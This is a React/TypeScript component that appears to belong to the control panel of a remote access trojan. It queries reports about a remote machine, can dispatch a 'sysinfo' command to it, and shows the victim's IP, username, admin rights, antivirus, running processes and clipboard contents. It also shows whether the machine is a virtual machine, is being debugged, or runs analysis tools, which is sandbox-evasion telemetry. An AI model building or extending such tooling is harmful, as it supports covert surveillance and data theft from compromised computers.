import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Skeleton } from "@/components/ui/skeleton";
import { Progress } from "@/components/ui/progress";
import { dispatchCommand } from "@/lib/commands";
import { toast } from "sonner";
import {
  Cpu,
  HardDrive,
  Network,
  Shield,
  Bug,
  MonitorSmartphone,
  Globe,
  RefreshCw,
  Clipboard,
  Users,
} from "lucide-react";

interface SystemInfoEntry {
  id: string;
  info_type: string;
  data: Record<string, unknown>;
  created_at: string;
}

const SystemInfoTab = ({ machineId }: { machineId: string }) => {
  const { data, isLoading, refetch } = useQuery({
    queryKey: ["system_info", machineId],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("system_info")
        .select("*")
        .eq("machine_id", machineId)
        .order("created_at", { ascending: false });
      if (error) throw error;
      return data as SystemInfoEntry[];
    },
  });

  const handleRefresh = async () => {
    const id = await dispatchCommand(machineId, "sysinfo");
    if (id) {
      toast.success("System info refresh requested");
      setTimeout(() => refetch(), 2000);
    }
  };

  if (isLoading) {
    return (
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
        {Array.from({ length: 6 }).map((_, i) => (
          <Card key={i} className="border-border/30">
            <CardHeader className="pb-2">
              <Skeleton className="w-24 h-5" />
            </CardHeader>
            <CardContent className="space-y-2">
              <Skeleton className="w-full h-4" />
              <Skeleton className="w-3/4 h-4" />
              <Skeleton className="w-1/2 h-4" />
            </CardContent>
          </Card>
        ))}
      </div>
    );
  }

  if (!data || data.length === 0) {
    return (
      <Card className="border-border/30">
        <CardContent className="p-8 text-center">
          <MonitorSmartphone className="w-10 h-10 mx-auto mb-3 text-muted-foreground/30" />
          <p className="text-muted-foreground mb-3">No system info reported yet</p>
          <Button variant="outline" size="sm" className="gap-2" onClick={handleRefresh}>
            <RefreshCw className="w-3.5 h-3.5" /> Request System Info
          </Button>
        </CardContent>
      </Card>
    );
  }

  // Use the latest full report
  const latest = data[0]?.data || {};

  const ramTotal = Number(latest.total_ram_mb) || 0;
  const ramAvail = Number(latest.avail_ram_mb) || 0;
  const ramUsed = ramTotal - ramAvail;
  const ramPct = ramTotal > 0 ? Math.round((ramUsed / ramTotal) * 100) : 0;

  const analysisTools = (latest.analysis_tools as string[]) || [];
  const network = (latest.network as Array<Record<string, string>>) || [];
  const runningProcs = (latest.running_procs as string[]) || [];

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <p className="text-xs text-muted-foreground/50">
          Last updated: {data[0]?.created_at ? new Date(data[0].created_at).toLocaleString() : "N/A"}
        </p>
        <Button variant="outline" size="sm" className="gap-1.5 h-7 text-xs" onClick={handleRefresh}>
          <RefreshCw className="w-3 h-3" /> Refresh
        </Button>
      </div>

      <div className="grid gap-3 md:grid-cols-2 lg:grid-cols-3">
        {/* Hardware */}
        <Card className="border-border/30">
          <CardHeader className="pb-2">
            <CardTitle className="text-xs flex items-center gap-2 text-muted-foreground">
              <Cpu className="w-3.5 h-3.5 text-primary" /> Hardware
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-3 text-sm">
            <InfoRow label="CPU" value={String(latest.cpu || "N/A")} />
            <div>
              <div className="flex items-center justify-between mb-1">
                <span className="text-xs text-muted-foreground">RAM</span>
                <span className="text-xs font-mono">
                  {ramUsed > 0 ? `${(ramUsed / 1024).toFixed(1)}` : "?"} / {(ramTotal / 1024).toFixed(1)} GB
                </span>
              </div>
              <Progress value={ramPct} className="h-1.5" />
            </div>
            <InfoRow label="Screen" value={String(latest.screen || "N/A")} />
            <InfoRow label="Architecture" value={String(latest.arch || "N/A")} />
          </CardContent>
        </Card>

        {/* Network */}
        <Card className="border-border/30">
          <CardHeader className="pb-2">
            <CardTitle className="text-xs flex items-center gap-2 text-muted-foreground">
              <Globe className="w-3.5 h-3.5 text-primary" /> Network
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 text-sm">
            <InfoRow label="Public IP" value={String(latest.public_ip || "N/A")} mono />
            {network.slice(0, 4).map((iface, i) => (
              <div key={i} className="flex items-center justify-between text-xs">
                <span className="text-muted-foreground">{iface.name}</span>
                <span className="font-mono text-muted-foreground/80">{iface.ip}</span>
              </div>
            ))}
          </CardContent>
        </Card>

        {/* Security */}
        <Card className="border-border/30">
          <CardHeader className="pb-2">
            <CardTitle className="text-xs flex items-center gap-2 text-muted-foreground">
              <Shield className="w-3.5 h-3.5 text-primary" /> Defensive Posture
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 text-sm">
            <InfoRow label="Admin" value={latest.is_admin ? "Yes" : "No"} />
            <div className="flex items-center justify-between text-xs">
              <span className="text-muted-foreground">Antivirus</span>
              <span className="text-right max-w-[180px] truncate">
                {String(latest.antivirus || "None detected").split("\n").filter(Boolean)[0] || "None"}
              </span>
            </div>
            <InfoRow label="PID" value={String(latest.pid || "N/A")} mono />
          </CardContent>
        </Card>

        {/* Analysis */}
        <Card className="border-border/30">
          <CardHeader className="pb-2">
            <CardTitle className="text-xs flex items-center gap-2 text-muted-foreground">
              <Bug className="w-3.5 h-3.5 text-primary" /> Analysis Detection
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 text-sm">
            <div className="flex items-center justify-between text-xs">
              <span className="text-muted-foreground">Virtual Machine</span>
              <Badge
                className={`text-[10px] ${
                  latest.is_vm
                    ? "bg-amber-500/15 text-amber-400"
                    : "bg-emerald-500/15 text-emerald-400"
                }`}
              >
                {latest.is_vm ? "Yes" : "No"}
              </Badge>
            </div>
            <div className="flex items-center justify-between text-xs">
              <span className="text-muted-foreground">Debugger</span>
              <Badge
                className={`text-[10px] ${
                  latest.is_debugged
                    ? "bg-red-500/15 text-red-400"
                    : "bg-emerald-500/15 text-emerald-400"
                }`}
              >
                {latest.is_debugged ? "Detected" : "No"}
              </Badge>
            </div>
            {analysisTools.length > 0 && (
              <div>
                <span className="text-xs text-muted-foreground">Tools found:</span>
                <div className="flex flex-wrap gap-1 mt-1">
                  {analysisTools.map((t, i) => (
                    <Badge key={i} variant="destructive" className="text-[10px]">
                      {t}
                    </Badge>
                  ))}
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* System */}
        <Card className="border-border/30">
          <CardHeader className="pb-2">
            <CardTitle className="text-xs flex items-center gap-2 text-muted-foreground">
              <HardDrive className="w-3.5 h-3.5 text-primary" /> System
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 text-sm">
            <InfoRow label="Computer" value={String(latest.computer_name || "N/A")} />
            <InfoRow label="User" value={String(latest.username || "N/A")} />
            <InfoRow label="OS" value={String(latest.os || "N/A")} />
          </CardContent>
        </Card>

        {/* Clipboard */}
        <Card className="border-border/30">
          <CardHeader className="pb-2">
            <CardTitle className="text-xs flex items-center gap-2 text-muted-foreground">
              <Clipboard className="w-3.5 h-3.5 text-primary" /> Clipboard
            </CardTitle>
          </CardHeader>
          <CardContent>
            <pre className="text-xs font-mono bg-muted/30 p-2 rounded max-h-24 overflow-auto whitespace-pre-wrap text-muted-foreground">
              {String(latest.clipboard || "(empty)")}
            </pre>
          </CardContent>
        </Card>
      </div>

      {/* Processes */}
      {runningProcs.length > 0 && (
        <Card className="border-border/30">
          <CardHeader className="pb-2">
            <CardTitle className="text-xs flex items-center gap-2 text-muted-foreground">
              <Users className="w-3.5 h-3.5 text-primary" /> Running Processes ({runningProcs.length})
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex flex-wrap gap-1 max-h-32 overflow-auto">
              {runningProcs.slice(0, 80).map((p, i) => (
                <Badge key={i} variant="secondary" className="text-[10px] font-mono bg-muted/30">
                  {p}
                </Badge>
              ))}
              {runningProcs.length > 80 && (
                <Badge variant="secondary" className="text-[10px]">
                  +{runningProcs.length - 80} more
                </Badge>
              )}
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  );
};

function InfoRow({ label, value, mono }: { label: string; value: string; mono?: boolean }) {
  return (
    <div className="flex items-center justify-between text-xs">
      <span className="text-muted-foreground">{label}</span>
      <span className={`text-right max-w-[200px] truncate ${mono ? "font-mono" : ""}`}>
        {value}
      </span>
    </div>
  );
}

export default SystemInfoTab;
